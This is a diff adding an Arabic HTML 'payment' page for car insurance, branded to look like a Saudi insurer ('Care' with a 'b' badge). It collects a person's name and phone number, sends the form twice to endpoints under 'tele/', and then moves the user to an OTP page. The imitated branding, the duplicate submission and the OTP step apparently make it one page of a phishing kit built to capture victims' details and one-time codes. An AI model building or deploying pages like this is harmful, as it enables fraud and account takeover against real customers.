@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>الدفع</title>
+  <style>
+    :root{--ink:#0b3550;--muted:#6b7280;--line:#e5e7eb;--brand:#1a5490;--accent:#ff8c00}
+    *{box-sizing:border-box}
+    body{margin:0;background:#f7f7f7;color:var(--ink);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+    .wrap{max-width:420px;margin:24px auto;padding:0 12px}
+    .card{background:#fff;border:1px solid var(--line);border-radius:14px;box-shadow:0 10px 24px rgba(0,0,0,.06);overflow:hidden}
+    .hd{background:linear-gradient(135deg,#1a5490 0%,#2d4a6b 100%);color:#fff;padding:20px;text-align:center}
+    .hd .brand{display:flex;gap:10px;justify-content:center;align-items:center}
+    .brand .t{font-weight:800;font-size:18px}
+    .brand .b{width:34px;height:34px;border-radius:50%;background:#fff;color:#1a5490;display:grid;place-items:center;font-weight:800}
+    .sec{padding:16px 16px 4px}
+    .ttl{font-size:15px;font-weight:800;margin:0 0 10px}
+    .row{display:flex;justify-content:space-between;margin:6px 0;font-size:14px}
+    .lbl{color:var(--muted)}
+    .v{font-weight:600}
+    .total{background:#eaf3ff;border:1px solid #dbe9ff;border-radius:10px;padding:12px;display:flex;justify-content:space-between;align-items:center;margin-top:10px;color:#1a5490;font-weight:800}
+    form{padding:16px}
+    .fg{margin-bottom:12px}
+    .fg label{display:block;margin-bottom:6px;font-size:14px;color:#1c2b3a}
+    .in{width:100%;height:46px;border:1.5px solid var(--line);border-radius:10px;padding:0 12px;font-size:14px;background:#fff}
+    .in:focus{outline:none;border-color:#1a5490}
+    .phone-wrapper{position:relative}
+    .phone-wrapper .flag{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:24px;pointer-events:none}
+    .in.phone{padding-right:50px;direction:ltr;text-align:left}
+    .note{font-size:12px;color:var(--muted);margin-top:6px;line-height:1.4}
+    .error{font-size:12px;color:#dc2626;margin-top:4px;display:none}
+    .btn{width:100%;height:50px;border:0;border-radius:12px;background:linear-gradient(135deg,#ffa500 0%,#ff8c00 100%);color:#fff;font-weight:800;font-size:15px;cursor:pointer;margin-top:8px}
+    .btn:disabled{opacity:.6;cursor:not-allowed}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="hd">
+        <div class="brand"><div class="t">Care</div><div class="b">b</div></div>
+        <div style="margin-top:6px;font-weight:700">تفاصيل الدفع</div>
+      </div>
+
+      <div class="sec" id="invoice">
+        <div class="ttl">ملخص التأمين</div>
+        <div class="row"><span class="lbl">الشركة:</span><span class="v" id="c_company">—</span></div>
+        <div class="row"><span class="lbl">نوع التأمين:</span><span class="v" id="c_plan">—</span></div>
+        <div class="row"><span class="lbl">القسط الأساسي:</span><span class="v" id="c_base">—</span></div>
+        <div class="row"><span class="lbl">المجموع الفرعي:</span><span class="v" id="c_price">—</span></div>
+        <div class="row"><span class="lbl">ضريبة 15%:</span><span class="v" id="c_vat">—</span></div>
+        <div class="total"><span>الإجمالي</span><span id="c_total">—</span></div>
+      </div>
+
+      <form id="payForm">
+        <div class="ttl" style="padding:0 16px 6px">معلومات التواصل</div>
+        
+        <div class="fg">
+          <label>الاسم الكامل</label>
+          <input class="in" type="text" name="name" id="name" placeholder="أدخل الاسم الكامل" required>
+        </div>
+
+        <div class="fg">
+          <label>رقم الهاتف</label>
+          <div class="phone-wrapper">
+            <span class="flag">🇸🇦</span>
+            <input class="in phone" type="tel" name="phone" id="phone" maxlength="10" placeholder="05XXXXXXXX" required>
+          </div>
+          <div class="error" id="phone-error">رقم الهاتف يجب أن يبدأ بـ 05</div>
+          <div class="note">ملاحظة: سيتم إرسال رمز لمرة واحدة لتأكيد استلام وثيقة التأمين</div>
+        </div>
+
+        <!-- حقول خفية -->
+        <input type="hidden" name="payment_method" id="payment_method" value="card">
+        <input type="hidden" name="company" id="h_company">
+        <input type="hidden" name="plan" id="h_plan">
+        <input type="hidden" name="base" id="h_base">
+        <input type="hidden" name="price" id="h_price">
+        <input type="hidden" name="vat" id="h_vat">
+        <input type="hidden" name="total" id="h_total">
+        <input type="hidden" name="features" id="h_features">
+        <input type="hidden" name="user_id" id="h_user_id">
+        <input type="hidden" name="start_date" id="h_start_date">
+        <input type="hidden" name="end_date" id="h_end_date">
+        <input type="hidden" name="insurance_json" id="h_insurance_json">
+        <input type="hidden" name="features_json"  id="h_features_json">
+        <input type="hidden" name="total_amount"   id="h_total_amount">
+
+        <button class="btn" id="submitBtn" type="submit">متابعة</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // تنسيق للعرض
+    const fmt = v => Number(v||0).toLocaleString('ar-EG',{minimumFractionDigits:2,maximumFractionDigits:2})+' ريال';
+
+    // user_id من الرابط (اختياري)
+    const urlParams = new URLSearchParams(window.location.search);
+    const userIdFromUrl = urlParams.get('user_id') || '';
+
+    // تحميل بيانات التأمين من localStorage
+    const raw = localStorage.getItem('insurance_data');
+    if(!raw){ 
+      alert('يرجى اختيار عرض التأمين أولاً'); 
+      window.location.href = userIdFromUrl ? `gher.html?user_id=${userIdFromUrl}` : 'gher.html'; 
+    }
+    
+    let ins = {};
+    try{ 
+      ins = JSON.parse(raw)||{}; 
+    }catch(e){ 
+      alert('تعذر قراءة بيانات التأمين'); 
+      window.location.href = userIdFromUrl ? `gher.html?user_id=${userIdFromUrl}` : 'gher.html'; 
+    }
+
+    // تعبئة العرض
+    c_company.textContent = ins.company || '—';
+    c_plan.textContent    = ins.plan    || '—';
+    c_base.textContent    = fmt(ins.base);
+    c_price.textContent   = fmt(ins.price);
+    c_vat.textContent     = fmt(ins.vat);
+    c_total.textContent   = fmt(ins.total);
+
+    // تعبئة الحقول الخفية
+    h_company.value   = ins.company || '';
+    h_plan.value      = ins.plan    || '';
+    h_base.value      = ins.base ?? '';
+    h_price.value     = ins.price ?? '';
+    h_vat.value       = ins.vat ?? '';
+    h_total.value     = ins.total ?? '';
+    h_features.value  = JSON.stringify(ins.features || []);
+    h_user_id.value   = userIdFromUrl;
+
+    const startDate = new Date();
+    const endDate   = new Date(); endDate.setFullYear(endDate.getFullYear()+1);
+    const toISO = d => d.toISOString().slice(0,10);
+    h_start_date.value = toISO(startDate);
+    h_end_date.value   = toISO(endDate);
+
+    // تجهيز حقول JSON
+    h_insurance_json.value = JSON.stringify({
+      company: ins.company, plan: ins.plan, base: ins.base, price: ins.price, vat: ins.vat, total: ins.total
+    });
+    h_features_json.value  = JSON.stringify(ins.features || []);
+    h_total_amount.value   = ins.total ?? '';
+
+    // تنسيق رقم الهاتف: أرقام فقط
+    const phoneInput = document.getElementById('phone');
+    const phoneError = document.getElementById('phone-error');
+
+    phoneInput.addEventListener('input', function(){
+      // السماح بالأرقام فقط
+      this.value = this.value.replace(/\D/g,'').slice(0,10);
+      
+      // التحقق من أن الرقم يبدأ بـ 05
+      if(this.value.length > 0 && !this.value.startsWith('05')){
+        phoneError.style.display = 'block';
+        this.style.borderColor = '#dc2626';
+      } else {
+        phoneError.style.display = 'none';
+        this.style.borderColor = '';
+      }
+    });
+
+    // التحقق عند محاولة الإرسال
+    payForm.addEventListener('submit', async (e)=>{
+      e.preventDefault();
+      
+      const phoneValue = phoneInput.value;
+      
+      // التحقق من أن الرقم يبدأ بـ 05
+      if(!phoneValue.startsWith('05')){
+        phoneError.style.display = 'block';
+        phoneInput.style.borderColor = '#dc2626';
+        phoneInput.focus();
+        return;
+      }
+      
+      // التحقق من أن الرقم 10 أرقام
+      if(phoneValue.length !== 10){
+        alert('يرجى إدخال رقم هاتف صحيح (10 أرقام)');
+        phoneInput.focus();
+        return;
+      }
+      
+      submitBtn.disabled = true; 
+      submitBtn.textContent = 'جارٍ الإرسال...';
+
+      const fd = new URLSearchParams(new FormData(payForm));
+
+      try{
+        // إرسال إلى الملف الأول
+        await fetch('tele/pay.php', {
+          method:'POST',
+          headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: fd.toString()
+        });
+        
+        // إرسال إلى الملف الثاني
+        await fetch('tele/pay2.php', {
+          method:'POST',
+          headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: fd.toString()
+        });
+        
+        // توجيه بعد الإرسال
+        location.href = 'otp.php' + (userIdFromUrl ? ('?user_id='+encodeURIComponent(userIdFromUrl)) : '');
+      }catch(err){
+        alert('تعذّر الإرسال، يرجى المحاولة مرة أخرى');
+        submitBtn.disabled = false; 
+        submitBtn.textContent = 'متابعة';
+      }
+    });
+  </script>
+</body>
+</html>
